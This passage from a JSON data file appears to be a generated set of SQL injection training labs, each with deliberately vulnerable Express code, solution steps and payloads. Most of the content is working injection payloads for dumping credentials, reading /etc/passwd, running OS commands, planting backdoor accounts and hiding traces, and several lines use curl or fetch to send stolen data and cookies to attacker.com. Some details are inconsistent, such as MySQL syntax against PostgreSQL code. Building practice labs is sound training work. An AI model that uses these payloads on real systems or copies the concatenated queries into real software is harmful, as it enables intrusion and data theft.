    "Lab Description": "The newsletter signup form takes an email and inserts it into a database. The input is directly embedded into the SQL query and errors are displayed. To solve: Perform SQL injection to extract the database schema and admin credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit test@example.com' to trigger SQL error",
      "Use UNION-based injection: ' UNION SELECT table_name,null FROM information_schema.tables--",
      "Extract column names from information_schema.columns",
      "Dump sensitive data from identified tables",
      "Document the database structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  const query = `INSERT INTO subscribers (email) VALUES ('${email}')`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Subscribed!');\n  });\n});",
    "payloads": [
      "test@example.com' UNION SELECT table_name,null FROM information_schema.tables--",
      "' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--"
    ]
  },
  {
    "Lab scenario": "SQL injection via URL parameter in product filtering",
    "Lab Description": "A product page filters items by category passed through URL. The app does not escape input and returns full query results. To solve: Inject SQL to extract database version, schema, and user credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Browse to /products?cat=1",
      "Determine column count using ORDER BY",
      "Inject: 1 UNION SELECT null,@@version,null--",
      "Extract table structure from information_schema",
      "Dump sensitive data using UNION SELECT"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/products', (req, res) => {\n  const cat = req.query.cat || '1';\n  const query = `SELECT id, name, price FROM items WHERE category_id=${cat}`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "1 UNION SELECT null,@@version,null--",
      "1 UNION SELECT null,table_name,null FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "SQL injection in e-commerce search autocomplete",
    "Lab Description": "The search endpoint for autocomplete queries embeds user input into SQL with no validation and returns matched results. To solve: Use SQL injection to list all database tables and extract sensitive customer data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture request to /search?q=a",
      "Determine column count using ORDER BY",
      "Inject: a%' UNION SELECT table_name,null FROM information_schema.tables--",
      "Extract column names for sensitive tables",
      "Dump customer emails and payment information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  const query = `SELECT name, description FROM products WHERE name LIKE '${q}%' LIMIT 5`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "a%' UNION SELECT table_name,null FROM information_schema.tables--",
      "x%' UNION SELECT email,credit_card FROM customers--"
    ]
  },
  {
    "Lab scenario": "SQL injection in forgotten password reset email lookup",
    "Lab Description": "Password reset sends an email if a user exists. The lookup query is vulnerable and returns different responses. To solve: Use boolean-based SQL injection to enumerate valid user emails and extract password hashes.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit test@example.com' OR 1=1-- to trigger all resets",
      "Use boolean conditions to test email existence",
      "Extract password hashes character by character",
      "Crack hashes offline",
      "Verify compromised accounts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  const query = `SELECT id FROM users WHERE email = '${email}'`;\n  db.query(query, (err, result) => {\n    if (result.rows.length) {\n      sendResetEmail(email);\n      return res.send('Reset link sent');\n    }\n    res.send('Email not found');\n  });\n});",
    "payloads": [
      "test@example.com' OR 1=1--",
      "admin@example.com' AND SUBSTRING(password,1,1)='a'--"
    ]
  },
  {
    "Lab scenario": "Blind SQL injection in user deletion audit trail",
    "Lab Description": "User deletion logs activity using input from 'reason' parameter. The app uses raw SQL for inserts with no feedback. To solve: Use time-based blind SQLi to infer database contents and extract sensitive information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /delete-user with reason=test",
      "Test for time delays: test' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--",
      "Extract data character by character using timing",
      "Automate extraction with SQLMap",
      "Document extracted credentials"
    ],
    "Vulnerability name": "Blind SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/delete-user', (req, res) => {\n  const reason = req.body.reason;\n  const query = `INSERT INTO deletions_log (user_id, reason) VALUES (${req.user.id}, '${reason}')`;\n  db.query(query);\n  res.send('User deleted.');\n});",
    "payloads": [
      "test' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--",
      "test' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50,SLEEP(5),0)--"
    ]
  },
  {
    "Lab scenario": "SQL injection in URL shortener preview endpoint",
    "Lab Description": "A preview feature allows users to inspect shortened URLs. It uses unsanitized query strings and returns full URL details. To solve: Use UNION-based SQLi to leak sensitive URLs and associated metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /preview?id=abc123",
      "Determine column count using ORDER BY",
      "Inject: abc123' UNION SELECT long_url,click_count,null FROM urls--",
      "Extract all URLs with metadata",
      "Identify sensitive internal URLs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT id, long_url, created_at FROM shortened WHERE id='${id}'`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "abc123' UNION SELECT long_url,click_count,null FROM urls--",
      "xyz789' UNION SELECT user_ip,referrer,null FROM url_access_logs--"
    ]
  },
  {
    "Lab scenario": "SQL injection in real-time chat message sending",
    "Lab Description": "Messages in a chat are saved using unsanitized input and returned to users. Attackers can inject SQL commands to extract historical messages. To solve: Dump the complete chat history and user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp to intercept POST /send with message param",
      "Payload: test'); SELECT username,message FROM chat JOIN users ON chat.user_id=users.id--",
      "View leaked messages with usernames in response",
      "Extract private messages between admins",
      "Document sensitive conversations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/send', (req, res) => {\n  const msg = req.body.message;\n  const query = `INSERT INTO chat (user_id, message) VALUES (${req.user.id}, '${msg}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "test'); SELECT username,message FROM chat JOIN users ON chat.user_id=users.id--",
      "hello'); UNION SELECT email,password FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL injection in blog comment reply system",
    "Lab Description": "Replying to blog comments appends user input into SQL statements and displays results. To solve: Inject SQL to enumerate database structure and extract admin credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit reply: test'); SELECT table_name FROM information_schema.tables--",
      "Identify users table structure",
      "Extract admin credentials: ' UNION SELECT username,password FROM admins--",
      "Verify credentials by logging in as admin",
      "Document database schema"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/reply', (req, res) => {\n  const reply = req.body.reply;\n  const query = `INSERT INTO replies (comment_id, text) VALUES (${req.params.id}, '${reply}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "test'); SELECT table_name FROM information_schema.tables--",
      "x'); UNION SELECT username,password FROM admins--"
    ]
  },
  {
    "Lab scenario": "SQL injection in contact form backend with stacked queries",
    "Lab Description": "The contact form saves user messages into the DB directly and allows stacked queries. Input is used without escaping. To solve: Use stacked queries to modify database content and gain admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send POST /contact with message: test'; CREATE TABLE backdoor(cmd TEXT);--",
      "Verify table creation through error messages",
      "Execute commands: '; COPY backdoor FROM PROGRAM 'id';--",
      "Exfiltrate data through created backdoor",
      "Clean up traces after exploitation"
    ],
    "Vulnerability name": "SQL injection (stacked queries)",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/contact', (req, res) => {\n  const msg = req.body.message;\n  const query = `INSERT INTO contact (email, message) VALUES ('${req.body.email}', '${msg}')`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Thanks!');\n  });\n});",
    "payloads": [
      "test'; CREATE TABLE backdoor(cmd TEXT);--",
      "hi'; COPY (SELECT * FROM passwords) TO '/var/www/html/leak.csv';--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Node ID Parameter",
    "Lab Description": "A GraphQL API implements node ID resolution with direct SQL concatenation. The global ID parameter is vulnerable to injection. To solve: Exploit the node resolver to extract schema metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send GraphQL introspection query to identify node field",
      "Craft malicious node ID: ' UNION SELECT schema_name FROM information_schema.schemata--",
      "Use aliases to bypass field type restrictions",
      "Extract database structure through ID parameter",
      "Map all database relations via GraphQL types"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const resolvers = {\n  Query: {\n    node: (_, { id }) => {\n      const [type, dbId] = decodeGlobalId(id);\n      return db.query(`SELECT * FROM ${type} WHERE id = '${dbId}'`);\n    }\n  }\n};",
    "payloads": [
      "VXNlcjoxJyBVTklPTiBTRUxFQ1QgdGFibGVfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMtLQ==",
      "VXNlcjonIFVOSU9OIFNFTEVDVCBzY2hlbWFfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YS0t"
    ]
  },
  {
    "Lab scenario": "SQL Injection in MongoDB Aggregation $convert to SQL Pipeline",
    "Lab Description": "A business intelligence system converts MongoDB aggregation pipelines to SQL for cross-database analytics. The $convert operator's expression evaluation fails to properly sanitize input when generating CAST operations in SQL. This allows breaking out of the aggregation context into raw SQL execution. The lab demonstrates how pipeline operators can become injection vectors when translated to relational queries.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable aggregation endpoints accepting $convert operations",
      "Craft malicious $convert expression: {\"$convert\":{\"input\":\"1\",\"to\":\"string\",\"onError\":\"'); SELECT * FROM payment_processor--\"}}",
      "Bypass type checking with nested $convert operations",
      "Leverage $function operator to execute stacked queries",
      "Exfiltrate sensitive financial data through error-based channel"
    ],
    "Vulnerability name": "Aggregation Pipeline SQL Injection",
    "srcCode": "app.post('/analytics', (req, res) => {\n  const pipeline = req.body.pipeline;\n  const sql = convertAggregationToSQL(pipeline);\n  db.query(`WITH report_data AS (${sql}) SELECT * FROM report_data`, (err, results) => {\n    if(err) return res.status(500).json({error: err.message});\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$convert\":{\"input\":{\"$toString\":\"$amount\"},\"to\":\"double\",\"onError\":{\"$concat\":[\"'\",\"); COPY (SELECT * FROM transactions) TO PROGRAM 'curl attacker.com/?exfil=$(base64 /tmp/data)'--\"]}}}",
      "{\"$function\":{\"body\":\"function() { return SQL.execute('CREATE ROLE attacker SUPERUSER'); }\"}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JWT Token Validation Query",
    "Lab Description": "The JWT validation process checks token validity against database using unsanitized claims. To solve: Forge malicious JWT with SQLi in claims to bypass authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT to identify vulnerable claims",
      "Modify user_id claim: 1' OR '1'='1",
      "Add SQLi in custom claims: ' UNION SELECT 1,'admin','admin'--",
      "Sign modified token with weak secret",
      "Access admin functionality with forged token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "function verifyToken(token) {\n  const decoded = jwt.verify(token, 'weak-secret');\n  const user = db.query(`SELECT * FROM users WHERE id = '${decoded.user_id}'`);\n  return user;\n}",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMScgT1IgJzEnPScxIn0.weak-signature",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4nIFVOSU9OIFNFTEVDVCAnYWRtaW4nLCdhZG1pbictLSJ9.weak-signature"
    ]
  },
  {
    "Lab scenario": "SQL Injection in CSV Export Field Terminator",
    "Lab Description": "A reporting tool allows custom CSV field terminators without validation. The terminator is used directly in SQL COPY command. To solve: Inject malicious terminators to execute OS commands.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept CSV export request",
      "Modify delimiter parameter: INTO OUTFILE '/tmp/test' FIELDS TERMINATED BY '=CMD|'",
      "Add command execution: LINES TERMINATED BY '/C calc.exe!'",
      "Trigger file processing on server",
      "Verify RCE through side effects"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export-csv', (req, res) => {\n  const { delimiter } = req.query;\n  db.query(`COPY (SELECT * FROM data) TO '/tmp/export.csv' WITH (FORMAT CSV, DELIMITER '${delimiter}')`);\n  res.download('/tmp/export.csv');\n});",
    "payloads": [
      "'=CMD|' LINES TERMINATED BY '/C calc.exe!'--",
      "0x3d434d447c204c494e4553205445524d494e4154454420425920272f432063616c632e65786521'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Full-Text Search Thesaurus",
    "Lab Description": "A search application loads custom thesaurus files from database. The thesaurus name parameter is vulnerable. To solve: Break thesaurus context to read arbitrary files.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable thesaurus parameter",
      "Break path context: english' FROM ts_debug('english','test') WHERE alias='word'--",
      "Read system files: pg_read_file('/etc/passwd')",
      "Access database configuration files",
      "Extract credentials from configs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { thesaurus } = req.query;\n  db.query(`ALTER TEXT SEARCH CONFIGURATION english ALTER MAPPING FOR word WITH ${thesaurus}`);\n  res.send('Thesaurus updated');\n});",
    "payloads": [
      "english' FROM ts_debug('english','test') WHERE alias='word'--",
      "simple, pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Array Constructor Function",
    "Lab Description": "A statistics dashboard builds array queries with user-controlled elements. The array constructor is vulnerable. To solve: Break array context to execute system commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable array parameter",
      "Break array syntax: ARRAY[1,2,3]::text) OR 1=1--",
      "Execute commands via COPY TO PROGRAM",
      "Exfiltrate data through network calls",
      "Verify command execution"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const { metrics } = req.query;\n  db.query(`SELECT array_to_json(ARRAY[${metrics}]) AS results`);\n  res.json(results);\n});",
    "payloads": [
      "1,2,3]::text) OR 1=1--",
      "1, (SELECT pg_read_file('/etc/passwd'))--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Window Function Frame Clause",
    "Lab Description": "An analytics API allows custom window frame specifications. The ROWS BETWEEN clause is vulnerable. To solve: Break frame context to dump user credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable frame parameter",
      "Break frame syntax: ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,username,password FROM users--",
      "Exfiltrate data through aggregate functions",
      "Bypass row-level security",
      "Access restricted analytics"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const { frame } = req.query;\n  db.query(`SELECT AVG(value) OVER (ORDER BY date ${frame}) FROM metrics`);\n  res.json(results);\n});",
    "payloads": [
      "ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,username,password FROM users--",
      "ROWS UNBOUNDED PRECEDING) EXECUTE IMMEDIATE 'COPY (SELECT * FROM secrets) TO ''/tmp/leak.csv'''--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JSON Path Query",
    "Lab Description": "A document store exposes JSON path queries that get converted to SQL. The jsonpath parameter is vulnerable. To solve: Break path context to read arbitrary tables.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable jsonpath parameter",
      "Break path syntax: $.user') OR 1=1--",
      "Access JSON storage internals",
      "Extract all documents through path traversal",
      "Bypass document-level permissions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-docs', (req, res) => {\n  const { path } = req.query;\n  db.query(`SELECT jsonb_path_query(doc, '${path}') FROM documents`);\n  res.json(results);\n});",
    "payloads": [
      "$.user') OR 1=1--",
      "$.user'')) FROM jsonb_array_elements(doc->'users') WHERE (doc->>'password') LIKE 'a%'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Recursive CTE Base Case",
    "Lab Description": "An org chart viewer builds recursive CTEs with user input in anchor member. The WITH RECURSIVE clause is vulnerable. To solve: Break recursion to access arbitrary tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable root node parameter",
      "Break CTE syntax: 1) UNION SELECT 1,username,password FROM users--",
      "Access recursive query internals",
      "Exfiltrate data through depth-limited recursion",
      "Bypass hierarchical access controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/org-chart', (req, res) => {\n  const { root } = req.query;\n  db.query(`WITH RECURSIVE hierarchy AS (\n    SELECT * FROM employees WHERE id = ${root}\n    UNION SELECT e.* FROM employees e JOIN hierarchy h ON e.manager_id = h.id\n  ) SELECT * FROM hierarchy`);\n  res.json(results);\n});",
    "payloads": [
      "1) UNION SELECT 1,username,password FROM users--",
      "1 OR EXISTS(SELECT * FROM sensitive_departments)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Custom Aggregate Function",
    "Lab Description": "A statistics application registers custom aggregates that use unsanitized input. The final function parameter is vulnerable. To solve: Break aggregate context to execute commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable aggregate function",
      "Break function syntax: my_agg(1) FROM (SELECT 1) x) OR 1=1--",
      "Access aggregate function internals",
      "Execute commands through extension functions",
      "Bypass aggregation constraints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const { param } = req.query;\n  db.query(`SELECT my_custom_agg(${param}) FROM metrics`);\n  res.json(results);\n});",
    "payloads": [
      "1) FROM (SELECT 1) x) OR 1=1--",
      "1); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL injection in mobile app profile update endpoint",
    "Lab Description": "The mobile app allows users to update their profile information. The `name` parameter is directly inserted into an UPDATE SQL query without sanitization. Error messages are displayed. To solve: Perform SQL injection to extract database schema information and modify other users' data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept profile update request with Burp Suite",
      "Test for errors with payload: test'",
      "Extract version with: test', email=(SELECT @@version)--",
      "Enumerate tables: test', email=(SELECT table_name FROM information_schema.tables LIMIT 1)--",
      "Modify admin data: test', is_admin=1 WHERE username='admin'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/update-profile', (req, res) => {\n  const { name, username } = req.body;\n  const query = `UPDATE users SET name='${name}' WHERE username='${username}'`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Profile updated');\n  });\n});",
    "payloads": [
      "test', email=(SELECT @@version)--",
      "test', is_admin=1 WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Error-based SQL injection in shopping cart total",
    "Lab Description": "The shopping cart calculates totals by querying product prices using product IDs. Detailed errors are reflected in responses. To solve: Extract database schema and contents through error messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send malformed product ID: 1'",
      "Confirm error leakage in response",
      "Extract version: 1 AND 1=CONVERT(int, @@version)--",
      "Enumerate tables: 1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))--",
      "Dump column data through errors"
    ],
    "Vulnerability name": "Error-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/cart-total', (req, res) => {\n  const id = req.query.product;\n  const query = `SELECT price FROM products WHERE id=${id}`;\n  db.query(query, (err, result) => {\n    if (err) return res.status(500).json({ error: err.message });\n    res.json({ total: result.rows[0].price });\n  });\n});",
    "payloads": [
      "1 AND 1=CONVERT(int, @@version)--",
      "1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))--"
    ]
  },
  {
    "Lab scenario": "SQL injection via hidden form field in registration form",
    "Lab Description": "A hidden referrer field in the registration form is used directly in SQL queries. The application returns query results in the response. To solve: Use UNION-based injection to extract user credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept registration request with Burp Suite",
      "Modify referrer field: ' UNION SELECT username,password FROM users--",
      "Determine correct number of columns first",
      "Extract admin credentials from response",
      "Verify by logging in with stolen credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/register', (req, res) => {\n  const { username, referrer } = req.body;\n  const query = `INSERT INTO users (username, referrer) VALUES ('${username}', '${referrer}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT username,password FROM users--",
      "' UNION SELECT null,table_name FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "Second-order SQL injection via stored user bio",
    "Lab Description": "User bios are stored and later used unsafely in admin search queries. No immediate feedback is available. To solve: Store malicious payload and trigger when admin searches user bios.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update bio to: '; INSERT INTO backdoor VALUES ('hacker','123')--",
      "Wait for admin to search bios",
      "Verify backdoor account creation",
      "Login with backdoor credentials",
      "Document delayed exploitation"
    ],
    "Vulnerability name": "Second-order SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/update-bio', (req, res) => {\n  const { bio } = req.body;\n  const query = `UPDATE users SET bio='${bio}' WHERE id=${req.user.id}`;\n  db.query(query);\n  res.send('Bio updated');\n});\n\napp.get('/admin/search-bios', (req, res) => {\n  const { term } = req.query;\n  const query = `SELECT * FROM users WHERE bio LIKE '%${term}%'`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "'; INSERT INTO backdoor VALUES ('hacker','123')--",
      "' UNION SELECT username,password FROM users WHERE '1'='1"
    ]
  },
  {
    "Lab scenario": "SQL injection in password reset token check",
    "Lab Description": "The password reset endpoint checks tokens without sanitization. Different responses indicate valid/invalid tokens. To solve: Use boolean-based injection to bypass token validation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept reset request: /reset?token=abc",
      "Test with: abc' OR '1'='1",
      "Confirm access to reset form",
      "Target specific user: abc' OR email='admin@example.com'--",
      "Reset admin password"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/reset-password', (req, res) => {\n  const { token } = req.query;\n  const query = `SELECT * FROM password_resets WHERE token='${token}' AND expires_at > NOW()`;\n  db.query(query, (err, result) => {\n    if (result.rows.length) {\n      return res.render('reset-form');\n    }\n    res.send('Invalid token');\n  });\n});",
    "payloads": [
      "abc' OR '1'='1",
      "xyz' OR email='admin@example.com'--"
    ]
  },
  {
    "Lab scenario": "SQL injection via HTTP Referer header in audit logs",
    "Lab Description": "Referer headers are logged directly into SQL. The admin panel displays logs with limited escaping. To solve: Inject XSS and SQLi payloads to steal admin cookies.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send request with Referer: attacker.com' UNION SELECT CONCAT('<script>alert(1)</script>',table_name) FROM information_schema.tables--",
      "Wait for admin to view logs",
      "Capture admin cookie via XSS",
      "Extract data through combined attack",
      "Document multi-vector exploit"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  const referer = req.headers.referer || 'direct';\n  const query = `INSERT INTO access_logs (referer) VALUES ('${referer}')`;\n  db.query(query);\n  next();\n});",
    "payloads": [
      "attacker.com' UNION SELECT CONCAT('<script>alert(1)</script>',table_name) FROM information_schema.tables--",
      "evil.com' UNION SELECT CONCAT('<img src=x onerror=fetch(`http://attacker.com?cookie=${document.cookie}`)>')--"
    ]
  },
  {
    "Lab scenario": "Boolean SQL injection in mobile banking app login",
    "Lab Description": "The login endpoint returns different responses for valid/invalid credentials. No direct output. To solve: Use boolean conditions to extract admin password hash character by character.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request",
      "Test with: admin' AND 1=1-- (valid) vs admin' AND 1=2-- (invalid)",
      "Extract password length: admin' AND LENGTH(password)=32--",
      "Brute-force each character: admin' AND SUBSTRING(password,1,1)='a'--",
      "Reconstruct full hash"
    ],
    "Vulnerability name": "Boolean-based blind SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.query(query, (err, result) => {\n    if (result.rows.length) {\n      return res.json({ status: 'success' });\n    }\n    res.json({ status: 'failure' });\n  });\n});",
    "payloads": [
      "admin' AND 1=1--",
      "admin' AND SUBSTRING(password,1,1)='a'--"
    ]
  },
  {
    "Lab scenario": "UNION-based SQLi in forum's search feature",
    "Lab Description": "The forum search directly embeds terms in SQL and returns full results. To solve: Use UNION injection to extract database version, tables, and user credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Search for: test' ORDER BY 5-- to find columns",
      "Inject: test' UNION SELECT 1,@@version,3,4--",
      "Extract tables: test' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--",
      "Dump credentials: test' UNION SELECT 1,username,password,4 FROM users--",
      "Document extracted data"
    ],
    "Vulnerability name": "UNION-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/forum/search', (req, res) => {\n  const { q } = req.query;\n  const query = `SELECT id, title, excerpt, author FROM posts WHERE title LIKE '%${q}%'`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "test' UNION SELECT 1,@@version,3,4--",
      "test' UNION SELECT 1,username,password,4 FROM users--"
    ]
  },
  {
    "Lab scenario": "Time-based SQLi in password verification API",
    "Lab Description": "The password verification API has identical responses but vulnerable to timing attacks. To solve: Use SLEEP() to extract admin password character by character.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Measure baseline response time",
      "Test with: admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(3),0)--",
      "Confirm timing difference for valid characters",
      "Automate extraction with Python script",
      "Reconstruct full password hash"
    ],
    "Vulnerability name": "Time-based blind SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/verify-password', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.query(query, (err, result) => {\n    res.json({ valid: result.rows.length > 0 });\n  });\n});",
    "payloads": [
      "admin' AND IF(SUBSTRING(password,1,1)='a',SLEEP(3),0)--",
      "admin' AND IF(ASCII(SUBSTRING(password,1,1))>100,SLEEP(3),0)--"
    ]
  },
  {
    "Lab scenario": "SQLi in e-learning platform course filter",
    "Lab Description": "The course topic filter is vulnerable to UNION-based injection. Results are displayed in the UI. To solve: Extract database version, schema, and user credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Filter by topic: ' ORDER BY 5-- to find columns",
      "Inject: ' UNION SELECT 1,@@version,3--",
      "Extract tables: ' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
      "Dump credentials: ' UNION SELECT 1,username,password FROM users--",
      "Verify by logging in with stolen credentials"
    ],
    "Vulnerability name": "UNION-based SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/courses', (req, res) => {\n  const { topic } = req.query;\n  const query = `SELECT id, name, instructor FROM courses WHERE topic='${topic}'`;\n  db.query(query, (err, results) => {\n    res.render('courses', { courses: results.rows });\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,@@version,3--",
      "' UNION SELECT 1,username,password FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in IoT Device Location Tracker",
    "Lab Description": "An IoT tracking system stores device location coordinates in a PostgreSQL database. The coordinate update endpoint directly concatenates latitude/longitude values into a geospatial query without sanitization. The application uses PostGIS functions that can be exploited to break out of the coordinate context. To solve: Exploit the ST_MakePoint function parameter injection to execute system commands through PostGIS extension functions and exfiltrate all device location history.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the device location update request containing latitude/longitude parameters",
      "Identify vulnerable parameter by testing with malformed coordinates: 0); SELECT 1--",
      "Break out of ST_MakePoint context: 0,0); COPY (SELECT * FROM devices) TO PROGRAM 'curl attacker.com/?leak=$(base64 /tmp/data)'--",
      "Verify data exfiltration by checking attacker server logs",
      "Escalate to RCE by loading malicious PostGIS extension"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-location', (req, res) => {\n  const { deviceId, lat, lng } = req.body;\n  const query = `UPDATE devices SET location = ST_MakePoint(${lat}, ${lng}) WHERE id = '${deviceId}'`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Location updated');\n  });\n});",
    "payloads": [
      "0,0); COPY (SELECT * FROM devices) TO PROGRAM 'curl attacker.com/?leak=$(base64 /tmp/data)'--",
      "0,0); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "GraphQL Query Depth Exploitation Leading to SQL Injection",
